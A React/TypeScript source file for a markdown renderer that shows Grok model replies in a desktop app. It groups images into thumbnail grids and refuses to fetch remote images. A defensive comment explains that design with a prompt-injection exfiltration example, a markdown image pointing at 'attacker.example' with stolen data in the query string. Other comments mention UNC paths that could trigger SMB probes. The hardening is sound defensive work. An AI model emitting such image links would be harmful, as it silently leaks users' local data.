import { useCallback, useMemo, useState, type ReactNode } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import type { PhrasingContent, Root, RootContent } from 'mdast'
import { looksLikeImagePath } from '../lib/image-refs'
import { LocalImage, ThumbnailGrid } from './LocalImage'

function CodeBlock({ className, children }: { className?: string; children?: ReactNode }) {
  const [copied, setCopied] = useState(false)
  const text = String(children ?? '').replace(/\n$/, '')
  const lang = className?.replace(/^language-/, '') || ''

  const copy = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setTimeout(() => setCopied(false), 1400)
    } catch {
      /* ignore */
    }
  }, [text])

  return (
    <div className="code-block">
      <div className="code-block-bar">
        <span className="code-lang">{lang || 'code'}</span>
        <button type="button" className="btn-mini" onClick={() => void copy()}>
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre>
        <code className={className}>{text}</code>
      </pre>
    </div>
  )
}

/**
 * Whitespace a URL parser ignores, in the form it can actually arrive in.
 *
 * A markdown destination wrapped in <> may contain spaces and tabs, and the
 * parser percent-encodes them rather than dropping them, so a leading space
 * reaches this component as the literal text `%20`. Neither `trim()` nor a
 * `/^https?:/` test sees through that, which is how `%20//host/x.png` was
 * classified as a local file path.
 */
const LEADING_BLANKS = /^(?:\s|%(?:09|0a|0b|0c|0d|20))+/i

function withoutLeadingBlanks(src: string): string {
  return src.replace(LEADING_BLANKS, '')
}

/**
 * Does this src address a remote host?
 *
 * Deliberately broader than it looks, because the answer decides whether a URL
 * is shown as a link or handed to the local-image reader, and the reader
 * resolves and stats whatever string it is given:
 *
 *  - the scheme is case-insensitive, so HTTPS:// has to count;
 *  - `https:host/x.png` and `https:/host/x.png` reach the same origin as
 *    `https://host/x.png` once a URL parser sees them, so only the colon is a
 *    reliable marker, not the slashes;
 *  - `//host/x.png` inherits the page's scheme, and on Windows it is also a UNC
 *    path, so leaving it to the local reader turns a paint into an SMB probe of
 *    a host the model chose.
 *
 * data: is deliberately absent. It is handled before this is ever called, and
 * answering yes here would send it to the link branch, where the host chip
 * would be the entire base64 payload.
 */
function isHttpUrl(src: string): boolean {
  const s = withoutLeadingBlanks(src)
  return /^https?:/i.test(s) || /^\/{2,}/.test(s)
}

/** The host, for showing the user where a remote image would come from. */
function hostOf(url: string): string {
  const s = withoutLeadingBlanks(url)
  try {
    return new URL(s).hostname || s
  } catch {
    // A src the parser rejects (an encoded tab inside the host, a
    // protocol-relative URL with no base) still has to tell the user where it
    // points, and a whole URL in a host-sized chip does not.
    return s.match(/^(?:[a-z][a-z0-9+.-]*:)?\/*([^/?#]+)/i)?.[1] || s
  }
}

function LocalOrRemoteImg({
  src,
  alt
}: {
  src?: string
  alt?: string
}) {
  if (!src) return null

  // Generated images arrive as data: URLs from readLocalImage, so they render
  // inline as normal. This branch has to stay first: the bytes are already
  // here, so there is no server to notify and nothing to defer, and the remote
  // branch below would label it with a host that does not exist.
  if (src.startsWith('data:')) {
    return <img src={src} alt={alt || ''} className="md-img" />
  }

  /*
   * A REMOTE image is offered as a link, never fetched.
   *
   * Rendering it as <img> means the app requests that URL the instant a reply
   * appears. Since the reply is model output, a prompt-injected model could
   * write ![](https://attacker.example/?d=<something it just read>) and the data
   * would leave silently, with no click and nothing on screen to notice. That is
   * the standard exfiltration channel for an app that renders model markdown,
   * and this one reads local files, so there is plenty worth taking.
   *
   * As a link, nothing loads until the user decides, the destination host is
   * visible before they decide, and the click opens their browser rather than
   * fetching inside the app. The CSP drops `img-src https:` to enforce it, so a
   * missed path here fails closed instead of silently loading.
   */
  if (isHttpUrl(src)) {
    return (
      <a
        href={src}
        className="md-remote-img"
        title={`Opens ${src} in your browser. Remote images are not loaded inside Gronk.`}
      >
        <span className="md-remote-img-icon" aria-hidden>
          ▣
        </span>
        <span className="md-remote-img-label">{alt?.trim() || 'Image'}</span>
        <span className="md-remote-img-host">{hostOf(src)}</span>
      </a>
    )
  }

  if (looksLikeImagePath(src)) {
    const altText = alt?.trim()
    const filename = src.replace(/\\/g, '/').split('/').pop() || src
    // No caption. It was set to the same alt text as the label, so every
    // generated image printed its description twice, one line under the other.
    return <LocalImage image={{ path: src, label: altText || filename }} />
  }

  // Anything else: a relative or unrecognised src that is not a remote URL, not
  // a data URL, and not image-shaped. react-markdown's own URL sanitiser has
  // already dropped every scheme except http, https, mailto, xmpp and irc, and
  // the first two are handled above, so what is left here cannot reach a server
  // even before the CSP refuses it. It either resolves locally or shows nothing.
  return <img src={src} alt={alt || ''} className="md-img" />
}

function pathKey(p: string): string {
  return p.replace(/\\/g, '/').toLowerCase()
}

function isSuppressed(href: string, suppress?: Set<string>): boolean {
  if (!suppress || !suppress.size) return false
  const key = pathKey(href)
  if (suppress.has(key)) return true
  // Match basename or images/N.ext against absolute paths in the suppress set
  const base = key.split('/').pop() || key
  for (const s of suppress) {
    if (s === key || s.endsWith('/' + key) || s.endsWith('/' + base) || s.endsWith(key)) {
      return true
    }
    if (key.endsWith('/' + (s.split('/').pop() || s))) return true
  }
  return false
}

/**
 * How many images in ONE message stop being pictures and become a list.
 *
 * Asked for a catalogue of vector graphics, Grok answered with about fifty
 * `![name](path)` lines. Each one rendered as a full width card with a filename
 * and an Open button, roughly 265px tall, so a single reply was some thirteen
 * thousand pixels of scrolling. Four or fewer is a set the reader wants to look
 * AT, and that case is deliberately left exactly as it was. Past that they want
 * to scan it, so the run becomes a grid of thumbnails.
 */
const GRID_MIN_IMAGES = 5

/**
 * Marks a paragraph the grouping pass merged. It never reaches the DOM: the `p`
 * override below swaps the whole paragraph for a ThumbnailGrid on sight of it.
 */
const GRID_MARKER = 'md-image-run'

type IsTile = (url: string) => boolean

/**
 * The url this node hands to <LocalImage>, or null if it is not one of them.
 *
 * Both routes count. Grok writes `![name](path)` for a generated image and also
 * `[path](path)`, and the two overrides below turn either into the same picture,
 * so the grouping has to agree with both or a grid would come out half empty.
 */
function tileUrl(node: RootContent | PhrasingContent, isTile: IsTile): string | null {
  if ((node.type === 'image' || node.type === 'link') && isTile(node.url)) return node.url
  return null
}

function countTiles(nodes: Array<RootContent | PhrasingContent>, isTile: IsTile): number {
  let count = 0
  for (const node of nodes) {
    if (tileUrl(node, isTile)) count++
    else if ('children' in node) count += countTiles(node.children, isTile)
  }
  return count
}

/** The tiles of a paragraph that holds nothing else, or null. */
function tilesOfParagraph(node: RootContent, isTile: IsTile): PhrasingContent[] | null {
  if (node.type !== 'paragraph') return null
  const tiles: PhrasingContent[] = []
  for (const child of node.children) {
    // The newline between two `![a](x)` lines of one paragraph is a text node.
    if (child.type === 'text' && !child.value.trim()) continue
    if (!tileUrl(child, isTile)) return null
    tiles.push(child)
  }
  return tiles.length ? tiles : null
}

/**
 * Merge each RUN of image-only paragraphs into one, marked for the grid.
 *
 * In place rather than hoisted to the end of the message: a catalogue is
 * usually a heading, its images, the next heading, its images, and moving the
 * pictures away from the headings that name them would be a worse answer than
 * the tall one. Runs are found at the top level only, which is where fifty
 * consecutive `![name](path)` lines land.
 */
function groupImageRuns(tree: Root, isTile: IsTile): void {
  if (countTiles(tree.children, isTile) < GRID_MIN_IMAGES) return

  const grouped: RootContent[] = []
  let run: PhrasingContent[] | null = null

  for (const node of tree.children) {
    const tiles = tilesOfParagraph(node, isTile)
    if (!tiles) {
      run = null
      grouped.push(node)
      continue
    }
    if (run) {
      run.push(...tiles)
      continue
    }
    run = tiles
    grouped.push({
      type: 'paragraph',
      children: run,
      // An array because that is how hast stores a class list; it is joined
      // back into one string before the `p` override ever sees it.
      data: { hProperties: { className: [GRID_MARKER] } }
    })
  }

  tree.children = grouped
}

/**
 * @param suppressImagePaths — image paths already shown in tool cards for this
 *   message; markdown links to the same file become a subtle caption instead of
 *   a second full preview.
 */
export function Markdown({
  text,
  suppressImagePaths
}: {
  text: string
  suppressImagePaths?: string[]
}) {
  // Joined, because the caller rebuilds this array on every render and a Set
  // built from a new array is a new dependency every time.
  const suppressKey = suppressImagePaths?.length ? suppressImagePaths.join('\n') : ''

  /*
   * Memoised because identity is what React reconciles on.
   *
   * These were rebuilt on every render, which made every <LocalImage> in a
   * message a different component type each time, so React threw the whole
   * subtree away and mounted it again, and mounting one re-reads its file over
   * IPC. Invisible with a single image; with fifty of them it is fifty disk
   * reads per render of a streaming reply. The grid also keeps state (which
   * images failed), and state does not survive a remount.
   */
  const suppress = useMemo(
    () => (suppressKey ? new Set(suppressKey.split('\n').map(pathKey)) : undefined),
    [suppressKey]
  )

  const remarkPlugins = useMemo(() => {
    const isTile: IsTile = (url) =>
      !isHttpUrl(url) && looksLikeImagePath(url) && !isSuppressed(url, suppress)
    return [remarkGfm, () => (tree: Root) => groupImageRuns(tree, isTile)]
  }, [suppress])

  const components = useMemo<Components>(
    () => ({
      pre({ children }) {
        return <>{children}</>
      },
      code({ className, children, ...props }) {
        const isBlock = Boolean(className) || String(children).includes('\n')
        if (isBlock) {
          return <CodeBlock className={className}>{children}</CodeBlock>
        }
        return (
          <code className={className} {...props}>
            {children}
          </code>
        )
      },
      p({ className, children }) {
        // A merged run of images is not a paragraph of prose, and a <figure>
        // is not legal inside a <p> either.
        if (className === GRID_MARKER) return <ThumbnailGrid>{children}</ThumbnailGrid>
        return <p className={className}>{children}</p>
      },
      img({ src, alt }) {
        // Remote first. isSuppressed matches on basename, so a remote URL
        // ending in a filename already shown in a tool card would collapse
        // into that file's caption, telling the user they have seen this
        // before about a URL they have never seen.
        if (src && !isHttpUrl(src) && isSuppressed(src, suppress)) {
          return (
            <span className="md-image-ref" title={src}>
              {alt || src.replace(/\\/g, '/').split('/').pop()}
            </span>
          )
        }
        return <LocalOrRemoteImg src={src} alt={alt} />
      },
      a({ href, children, ...props }) {
        // Grok links generated images as [images/1.jpg](images/1.jpg) —
        // render the image itself instead of a dead relative link.
        //
        // looksLikeImagePath only declines a lowercase http/https prefix,
        // so [x](HTTPS://host/x.png) and [x](//host/x.png) were read as
        // generated images and sent to the local-image reader. A remote
        // href stays an ordinary link, which is what the lowercase form
        // already did.
        if (href && !isHttpUrl(href) && looksLikeImagePath(href)) {
          if (isSuppressed(href, suppress)) {
            const label =
              typeof children === 'string' && children.trim()
                ? children.trim()
                : href.replace(/\\/g, '/').split('/').pop() || href
            return <span className="md-image-ref">{label}</span>
          }
          const label =
            typeof children === 'string' && children.trim()
              ? children.trim()
              : href.replace(/\\/g, '/').split('/').pop() || href
          return (
            <LocalImage
              image={{
                path: href,
                label
              }}
            />
          )
        }
        // External / mailto stay as normal links (Electron will open externally)
        return (
          <a href={href} target="_blank" rel="noreferrer" {...props}>
            {children}
          </a>
        )
      }
    }),
    [suppress]
  )

  if (!text) return null

  return (
    <div className="md">
      <ReactMarkdown remarkPlugins={remarkPlugins} components={components}>
        {text}
      </ReactMarkdown>
    </div>
  )
}
